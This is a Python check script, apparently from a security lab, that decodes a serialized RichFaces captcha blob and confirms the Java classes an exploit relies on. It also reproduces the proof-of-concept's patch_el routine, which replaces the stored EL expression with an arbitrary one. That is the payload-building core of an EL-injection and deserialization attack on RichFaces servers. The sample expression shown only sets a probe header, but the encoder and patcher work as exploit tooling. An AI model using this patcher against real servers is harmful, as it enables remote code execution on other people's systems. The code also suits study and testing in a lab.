#!/usr/bin/env python3
"""
Round-trip check for the lab's serialized captcha blob.

Verifies the two invariants the PoC depends on:
  1. RichFactors decode(base64 -> zlib) recovers the Java serialization stream.
  2. patch_el() finds EXACTLY two EL sites and no OLD_EL survives afterwards.

Run: python3 tools/check_blob.py <blob>
"""

import base64
import struct
import sys
import zlib

OLD_EL = b"#{userLoginController.paintCaptcha}"


def rf_decode(blob):
    s = blob.strip().replace("!", "/").replace("-", "+").replace("_", "=")
    s += "=" * ((4 - len(s) % 4) % 4)
    return zlib.decompress(base64.b64decode(s))


def rf_encode(raw):
    b = base64.b64encode(zlib.compress(raw, 1)).decode("ascii")
    return b.replace("+", "-").replace("/", "!").replace("=", "_")


def _utf(data):
    return struct.pack(">H", len(data)) + data


def patch_el(ser, new_el):
    """Verbatim copy of the PoC's patcher (poc/p2d.py)."""
    new_b = new_el.encode("utf-8")
    out = bytearray(ser)
    patches = []
    i = 0
    while i < len(out) - 1:
        if out[i] != 0x77:
            i += 1
            continue
        blen = out[i + 1]
        bstart, bend = i + 2, i + 2 + blen
        if bend > len(out):
            i += 1
            continue
        body = bytes(out[bstart:bend])
        if len(body) >= 2:
            ulen = struct.unpack_from(">H", body, 0)[0]
            if ulen == len(body) - 2 and OLD_EL in body[2 : 2 + ulen]:
                patches.append(
                    (i, bend, _utf(body[2 : 2 + ulen].replace(OLD_EL, new_b)))
                )
            elif ulen == len(OLD_EL) and body[2 : 2 + ulen] == OLD_EL:
                patches.append((i, bend, _utf(new_b) + body[2 + ulen :]))
        i = bend
    if len(patches) != 2:
        raise RuntimeError("EL sites: %d" % len(patches))
    for start, bend, nb in sorted(patches, key=lambda p: -p[0]):
        repl = (
            bytes([0x77, len(nb)]) + nb
            if len(nb) <= 255
            else bytes([0x7A]) + struct.pack(">I", len(nb)) + nb
        )
        out[start:bend] = repl
    blob = bytes(out)
    if OLD_EL in blob:
        raise RuntimeError("old EL remains")
    return blob


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 2
    blob = argv[1]

    ser = rf_decode(blob)
    ok = True

    if ser[:4] == b"\xac\xed\x00\x05":
        print("[ok]   Java serialization magic ac ed 00 05")
    else:
        print("[FAIL] bad magic: %s" % ser[:4].hex())
        ok = False

    print("[ok]   stream length: %d bytes" % len(ser))
    print("[ok]   OLD_EL occurrences: %d" % ser.count(OLD_EL))

    for cls in [
        b"org.richfaces.renderkit.html.Paint2DResource$ImageData",
        b"javax.faces.component.StateHolderSaver",
        b"org.richfaces.component.tag.TagMethodExpression",
        b"com.sun.faces.el.MethodExpressionImpl",
    ]:
        if cls in ser:
            print("[ok]   class present: %s" % cls.decode())
        else:
            print("[FAIL] class missing: %s" % cls.decode())
            ok = False

    test_el = '#{facesContext.getExternalContext().getResponse().setHeader("X-Probe","ok")}'
    try:
        patched = patch_el(ser, test_el)
        print("[ok]   patch_el found exactly 2 sites")
        print("[ok]   patched stream: %d bytes (delta %+d)" % (len(patched), len(patched) - len(ser)))
    except RuntimeError as e:
        print("[FAIL] patch_el: %s" % e)
        return 1

    # The patched stream must still be a structurally valid serialization stream.
    if patched[:4] == b"\xac\xed\x00\x05" and OLD_EL not in patched:
        print("[ok]   patched stream retains magic and has no residual OLD_EL")
    else:
        print("[FAIL] patched stream malformed")
        ok = False

    # Re-encode must be byte-stable against the lab's encoder.
    if rf_encode(ser) == blob:
        print("[ok]   RichFactors encode/decode is byte-stable")
    else:
        print("[warn] re-encode differs (padding/level variance) -- decode still fine")

    print("\nRESULT: %s" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
